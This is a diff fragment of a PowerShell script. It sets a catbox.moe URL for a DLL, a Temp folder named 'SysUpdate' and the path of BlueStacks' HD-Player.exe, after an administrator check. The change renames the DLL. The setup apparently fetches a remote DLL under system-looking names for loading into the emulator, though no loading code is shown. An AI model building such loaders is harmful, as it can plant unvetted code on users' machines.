@@ -6,7 +6,7 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 
 # 2. ตั้งค่าไฟล์
 $url = "https://files.catbox.moe/0ukxya.dll"
-$fileName = "SystemData.dll" 
+$fileName = "0ukxya.dll" 
 $workDir = "$env:LOCALAPPDATA\Temp\SysUpdate"
 $dllPath = Join-Path $workDir $fileName
 $blueStacksPath = "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
